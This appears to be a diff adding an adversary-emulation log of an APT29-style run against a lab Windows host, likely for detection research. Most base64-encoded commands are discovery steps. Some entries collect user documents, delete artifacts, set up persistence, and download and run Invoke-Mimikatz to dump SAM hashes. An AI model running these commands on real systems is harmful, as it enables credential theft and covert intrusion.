+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "59592c35-8207-4896-8d8b-36ad4600245d",
+      "ability_name": "Remote System Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate DCs within the domain"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Remote System Discovery",
+      "technique_id": "T1018"
+    },
+    "agent_reported_time": "2022-09-29T19:48:33Z"
+  },
+  {
+    "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb21wdXRlcnMiIC9kb21haW4=",
+    "delegated_timestamp": "2022-09-29T19:48:35Z",
+    "collected_timestamp": "2022-09-29T19:49:16Z",
+    "finished_timestamp": "2022-09-29T19:49:16Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 4752,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "24ed020e-4730-4000-b6b4-6b5d3e95314f",
+      "ability_name": "Remote System Discovery (2) (2) (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate hosts within the domain."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Remote System Discovery",
+      "technique_id": "T1018"
+    },
+    "agent_reported_time": "2022-09-29T19:49:16Z"
+  },
+  {
+    "command": "cG93ZXJzaGVsbC5leGU7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gUG93ZXJTaGVsbCBzdWNjZXNzZnVsbHkgc3Bhd25lZCI7ICBleGl0IDA7fQ==",
+    "delegated_timestamp": "2022-09-29T19:48:35Z",
+    "collected_timestamp": "2022-09-29T19:48:36Z",
+    "finished_timestamp": "2022-09-29T19:48:36Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 3736,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a5daa530-c640-49bc-aa54-6808789a684a",
+      "ability_name": "PowerShell",
+      "ability_description": "Spawn powershell.exe from cmd.exe"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    },
+    "agent_reported_time": "2022-09-29T19:48:35Z"
+  },
+  {
+    "command": "bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcw==",
+    "delegated_timestamp": "2022-09-29T19:49:20Z",
+    "collected_timestamp": "2022-09-29T19:50:01Z",
+    "finished_timestamp": "2022-09-29T19:50:02Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 512,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5f4263c4-7ff1-4098-b5f5-f41faa31cf5b",
+      "ability_name": "System Network Configuration Discovery (2) (2) (2)",
+      "ability_description": "The netsh utility is executed via cmd to enumerate local firewall configuration information."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Configuration Discovery",
+      "technique_id": "T1016"
+    },
+    "agent_reported_time": "2022-09-29T19:50:01Z"
+  },
+  {
+    "command": "JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXERyYWZ0LlppcCAtRm9yY2U=",
+    "delegated_timestamp": "2022-09-29T19:49:21Z",
+    "collected_timestamp": "2022-09-29T19:49:34Z",
+    "finished_timestamp": "2022-09-29T19:50:00Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6764,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5692da31-3586-4e4f-8f07-5750070c730b",
+      "ability_name": "Automated Collection",
+      "ability_description": "Execute PowerShell from cmd.exe to collect and compress files of specific extensions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Automated Collection",
+      "technique_id": "T1119"
+    },
+    "agent_reported_time": "2022-09-29T19:49:34Z"
+  },
+  {
+    "command": "JHBzID0gZ2V0LXByb2Nlc3M7d3JpdGUtb3V0cHV0ICRwczs=",
+    "delegated_timestamp": "2022-09-29T19:50:06Z",
+    "collected_timestamp": "2022-09-29T19:50:40Z",
+    "finished_timestamp": "2022-09-29T19:50:41Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 908,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "646be6c9-f27a-4f5f-be5d-b8a0317e215f",
+      "ability_name": "Process Discovery (2) (2)",
+      "ability_description": "List running process on the machine via PowerShell."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T19:50:40Z"
+  },
+  {
+    "command": "aXBjb25maWcgL2FsbA==",
+    "delegated_timestamp": "2022-09-29T19:50:06Z",
+    "collected_timestamp": "2022-09-29T19:50:32Z",
+    "finished_timestamp": "2022-09-29T19:50:32Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7076,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+      "ability_name": "System Network Configuration Discovery (2)",
+      "ability_description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Configuration Discovery",
+      "technique_id": "T1016"
+    },
+    "agent_reported_time": "2022-09-29T19:50:32Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiOykpIHsgIHdyaXRlLWhvc3QgIlshXSBUaGUgcGF0aCBDOlxQcm9ncmFtIEZpbGVzXFN5c0ludGVybmFsc1N1aXRlIGRvZXMgbm90IGV4aXN0LiBFeGVjdXRpb24gaGFzIHN0b3BwZWQuIjsgIGV4aXQgMTt9U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c0ludGVybmFsc1N1aXRlIjtnY2kgJGVudjp1c2VycHJvZmlsZVxEZXNrdG9wOy5cc2RlbGV0ZTY0LmV4ZSAvYWNjZXB0ZXVsYSAiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wXOKArmNvZC4zYWthMy5zY3IiOy5cc2RlbGV0ZTY0LmV4ZSAvYWNjZXB0ZXVsYSAiJGVudjpBUFBEQVRBXERyYWZ0LlppcCI7LlxzZGVsZXRlNjQuZXhlIC9hY2NlcHRldWxhICIkZW52OlVTRVJQUk9GSUxFXERvd25sb2Fkc1xTeXNJbnRlcm5hbHNTdWl0ZS56aXAiOw==",
+    "delegated_timestamp": "2022-09-29T19:50:46Z",
+    "collected_timestamp": "2022-09-29T19:51:35Z",
+    "finished_timestamp": "2022-09-29T19:51:37Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7068,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "9b5b5aec-32ff-4d74-8555-727b50ab15f6",
+      "ability_name": "Artifact Cleanup - Delete Files",
+      "ability_description": "Cleanup files related to Operation"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "technique_id": "T1070.004"
+    },
+    "agent_reported_time": "2022-09-29T19:51:35Z"
+  },
+  {
+    "command": "YXJwIC1h",
+    "delegated_timestamp": "2022-09-29T19:50:46Z",
+    "collected_timestamp": "2022-09-29T19:51:28Z",
+    "finished_timestamp": "2022-09-29T19:51:28Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 3964,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+      "ability_name": "System Network Configuration Discovery (2) (2)",
+      "ability_description": "The arp utility is executed via cmd to enumerate local ARP configuration information."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Configuration Discovery",
+      "technique_id": "T1016"
+    },
+    "agent_reported_time": "2022-09-29T19:51:28Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiO2lmICghKHRlc3QtcGF0aCAiLlxyZWFkbWUucHMxIikpIHsgIE1vdmUtSXRlbSAuXHJlYWRtZS50eHQgcmVhZG1lLnBzMSAtRm9yY2U7fS4gLlxyZWFkbWUucHMxO0ludm9rZS1EaXNjb3Zlcnk7",
+    "delegated_timestamp": "2022-09-29T19:51:41Z",
+    "collected_timestamp": "2022-09-29T19:52:39Z",
+    "finished_timestamp": "2022-09-29T19:52:40Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1524,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "6f1f4768-7099-45d2-a858-b49dc792234e",
+      "ability_name": "Loading Stage-2 & Performing Discovery",
+      "ability_description": "Load Stage-2 from Modified Sysinternals Toolset"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T19:52:39Z"
+  },
+  {
+    "command": "ZWNobyAlVVNFUkRPTUFJTiVcJVVTRVJOQU1FJQ==",
+    "delegated_timestamp": "2022-09-29T19:51:42Z",
+    "collected_timestamp": "2022-09-29T19:52:12Z",
+    "finished_timestamp": "2022-09-29T19:52:12Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4028,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+      "ability_name": "System Owner / User Discovery",
+      "ability_description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033"
+    },
+    "agent_reported_time": "2022-09-29T19:52:12Z"
+  },
+  {
+    "command": "bmV0c3RhdCAtYW5v",
+    "delegated_timestamp": "2022-09-29T19:52:42Z",
+    "collected_timestamp": "2022-09-29T19:53:42Z",
+    "finished_timestamp": "2022-09-29T19:53:42Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 2956,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
+      "ability_name": "4.C.2 - System Network Connections Discovery (T1049)",
+      "ability_description": "The netstat utility is executed via cmd to enumerate local active network connections."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Connections Discovery",
+      "technique_id": "T1049"
+    },
+    "agent_reported_time": "2022-09-29T19:53:42Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7UHJvY2Vzc0xpc3Q=",
+    "delegated_timestamp": "2022-09-29T19:52:42Z",
+    "collected_timestamp": "2022-09-29T19:53:00Z",
+    "finished_timestamp": "2022-09-29T19:53:11Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6136,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+      "ability_name": "Process Discovery",
+      "ability_description": "API call(s) are executed to enumerate local running processes."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T19:53:00Z"
+  },
+  {
+    "command": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9OyR3ZWIgPSAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCk7JHJlc3VsdCA9ICR3ZWIuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9FbXBpcmVQcm9qZWN0L0VtcGlyZS9tYXN0ZXIvZGF0YS9tb2R1bGVfc291cmNlL2NyZWRlbnRpYWxzL0ludm9rZS1NaW1pa2F0ei5wczEiKTtpZXggJHJlc3VsdDtmdW5jdGlvbiBoYXNoZHVtcHsgICAgSW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGxzYWR1bXA6OnNhbSBleGl0In07aGFzaGR1bXA7",
+    "delegated_timestamp": "2022-09-29T19:53:47Z",
+    "collected_timestamp": "2022-09-29T19:54:23Z",
+    "finished_timestamp": "2022-09-29T19:54:36Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 600,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "effbedc1-1bc8-4a75-9395-980559700008",
+      "ability_name": "Credential Dumping using Process Injection",
+      "ability_description": "Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    },
+    "agent_reported_time": "2022-09-29T19:54:23Z"
+  },
+  {
+    "command": "dGFza2xpc3QgL3Y=",
+    "delegated_timestamp": "2022-09-29T19:53:47Z",
+    "collected_timestamp": "2022-09-29T19:54:20Z",
+    "finished_timestamp": "2022-09-29T19:54:20Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 788,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+      "ability_name": "Process Discovery (2)",
+      "ability_description": "The tasklist utility is executed via cmd to enumerate local running processes."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T19:54:20Z"
+  },
+  {
+    "command": "U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c2ludGVybmFsc1N1aXRlIjtpZiAoZ2V0LXNlcnZpY2UgLW5hbWUgImphdmFtdHN1cCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgIHdyaXRlLWhvc3QgIlsqXSBTZXJ2aWNlIGFscmVhZHkgZXhpc3RzLi4uTm90IHJ1bm5pbmcgcGVyc2lzdGVuY2Ugc3RlcC0xIjsgIGV4aXQgMTt9aWYgKFRlc3QtUGF0aCAtcGF0aCAicmVhZG1lLnBzMSIpIHsgIC4gLlxyZWFkbWUucHMxOyAgSW52b2tlLVBlcnNpc3RlbmNlIC1QZXJzaXN0U3RlcCAxOyAgd3JpdGUtaG9zdCAiWytdIFBlcnNpc3RlbmNlIDEgaW52b2tlZC4iOyAgZXhpdCAwO30gZWxzZSB7ICB3cml0ZS1ob3N0ICJbIV0gcmVhZG1lLnBzMSBub3QgZm91bmQuIjsgIGV4aXQgMTt9",
+    "delegated_timestamp": "2022-09-29T19:54:37Z",
+    "collected_timestamp": "2022-09-29T19:55:04Z",
+    "finished_timestamp": "2022-09-29T19:55:05Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5444,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "9c75155e-21ab-4471-af16-45f3795a313c",
+      "ability_name": "Persistent Service 1",
+      "ability_description": "Leverage modified Sysinternals"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "persistence",
+      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
+      "technique_id": "T1547.009"
+    },
+    "agent_reported_time": "2022-09-29T19:55:04Z"
+  },
+  {
+    "command": "c2MgcXVlcnk=",
+    "delegated_timestamp": "2022-09-29T19:54:37Z",
+    "collected_timestamp": "2022-09-29T19:55:07Z",
+    "finished_timestamp": "2022-09-29T19:55:07Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7228,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+      "ability_name": "System Service Discovery (2) (2)",
+      "ability_description": "The sc utility is executed via cmd to enumerate local active services."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Service Discovery",
+      "technique_id": "T1007"
+    },
+    "agent_reported_time": "2022-09-29T19:55:07Z"
+  },
+  {
+    "command": "U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c2ludGVybmFsc1N1aXRlIjtpZiAoVGVzdC1QYXRoIC1wYXRoICJyZWFkbWUucHMxIikgeyAgLiAuXHJlYWRtZS5wczE7ICBJbnZva2UtUGVyc2lzdGVuY2UgLVBlcnNpc3RTdGVwIDI7ICB3cml0ZS1ob3N0ICJbK10gUGVyc2lzdGVuY2UgMiBpbnZva2VkLiI7fSBlbHNlIHsgIHdyaXRlLWhvc3QgIlshXSByZWFkbWUucHMxIG5vdCBmb3VuZC4iOyAgcmV0dXJuIDE7fQ==",
+    "delegated_timestamp": "2022-09-29T19:55:08Z",
+    "collected_timestamp": "2022-09-29T19:55:58Z",
+    "finished_timestamp": "2022-09-29T19:55:59Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1204,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "45f18b58-c14f-4b61-a3da-41b67af21429",
+      "ability_name": "Persistent Service 2",
+      "ability_description": "Leverage modified Sysinternals"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "persistence",
+      "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
+      "technique_id": "T1547.009"
+    },
+    "agent_reported_time": "2022-09-29T19:55:58Z"
+  },
+  {
+    "command": "bmV0IHN0YXJ0",
+    "delegated_timestamp": "2022-09-29T19:55:08Z",
+    "collected_timestamp": "2022-09-29T19:55:55Z",
+    "finished_timestamp": "2022-09-29T19:55:55Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7764,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+      "ability_name": "System Service Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate local active services."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Service Discovery",
+      "technique_id": "T1007"
+    },
+    "agent_reported_time": "2022-09-29T19:55:55Z"
+  },
+  {
